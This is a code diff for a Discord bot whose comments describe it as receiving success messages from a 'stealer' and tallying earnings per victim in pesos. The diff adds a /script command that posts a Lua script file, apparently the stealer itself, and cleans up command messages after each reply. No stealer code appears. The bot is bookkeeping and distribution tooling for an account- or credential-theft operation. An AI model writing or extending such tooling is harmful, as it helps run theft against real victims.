@@ -10,6 +10,7 @@ YOUR_USER_ID = 1380109644558503977           # Only you can use commands
 SUCCESS_CHANNEL_ID = 1488400266075045898     # Channel where stealer sends success messages
 PH_TIMEZONE = timezone(timedelta(hours=8))   # Philippines time
 DATA_FILE = 'successes.json'
+SCRIPT_FILE = 'script.lua'                   # Lua file path
 
 # ===== BOT SETUP =====
 intents = discord.Intents.default()
@@ -53,8 +54,7 @@ async def on_message(message):
     await bot.process_commands(message)
 
 # ----- Auto-delete user's command message after responding -----
-@bot.after_invoke
-async def delete_command_message(ctx):
+async def safe_delete(ctx):
     try:
         await ctx.message.delete()
     except:
@@ -73,6 +73,7 @@ async def calculate(ctx):
     embed.add_field(name="Successes", value=str(successes), inline=True)
     embed.add_field(name="Earnings", value=f"₱{earnings}", inline=True)
     await ctx.send(embed=embed)
+    await safe_delete(ctx)
 
 @bot.command()
 @commands.check(is_me)
@@ -84,6 +85,7 @@ async def total(ctx):
     embed.add_field(name="Total Successes", value=str(total_successes))
     embed.add_field(name="Total Earnings", value=f"₱{total_earnings}")
     await ctx.send(embed=embed)
+    await safe_delete(ctx)
 
 @bot.command()
 @commands.check(is_me)
@@ -97,6 +99,25 @@ async def history(ctx, days: int = 7):
         lines.append(f"{date}: **{count}** successes (₱{count*2})")
     embed = discord.Embed(title=f"📈 Last {days} Days", description="\n".join(lines), color=discord.Color.blue())
     await ctx.send(embed=embed)
+    await safe_delete(ctx)
+
+# ===== NEW COMMAND: /script =====
+@bot.command()
+@commands.check(is_me)
+async def script(ctx):
+    try:
+        with open(SCRIPT_FILE, "r", encoding="utf-8") as f:
+            content = f.read()
+
+        if len(content) > 1900:
+            # Too long → send as a file
+            await ctx.send("📄 Script is too long, sending as a file:", file=discord.File(SCRIPT_FILE))
+        else:
+            # Short → send in a code block (copyable on mobile)
+            await ctx.send(f"```lua\n{content}\n```")
+    except FileNotFoundError:
+        await ctx.send("❌ Lua script not found!")
+    await safe_delete(ctx)
 
 # ===== FIXED MIDNIGHT RESET TASK =====
 @tasks.loop(minutes=1)
@@ -106,7 +127,6 @@ async def reset_at_midnight():
     if now.hour == 0 and now.minute == 0:
         data = load_data()
         today = get_today()
-
         if today not in data:
             data[today] = 0
             save_data(data)
